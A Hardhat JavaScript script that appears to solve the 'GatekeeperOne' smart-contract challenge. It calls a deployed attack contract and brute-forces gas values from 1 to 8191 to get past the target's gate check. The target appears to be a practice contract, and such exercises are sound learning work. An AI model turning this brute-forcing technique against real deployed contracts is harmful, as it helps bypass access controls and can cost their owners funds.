const hre = require("hardhat");
const abi = require("../artifacts/contracts/GatekeeperOneHack.sol/GatekeeperOneHack.json");

async function main() {
    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address);

    const contractAddress = "0xe4C6A9d64B049E6079F3B9dc40457B2bE6D30df7";
    const contractABI = abi.abi;
    const gatekeeperOneHack = new hre.ethers.Contract(contractAddress, contractABI, deployer);

    const targetAddress = "0x8a492bB541cE60927266C1d64b08f8F8B9926294";

    for (let gas = 1; gas <= 8191; gas++) {
        try {
            console.log(`Attempting with gas: ${gas}`);
            const result = await gatekeeperOneHack.enter(targetAddress, gas);
            await result.wait();
            console.log("Success with gas:", gas);
            break;  // if successful, exit the loop
        } catch (error) {
            console.log(`Failed with gas ${gas}: ${error.message}`);
        }
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});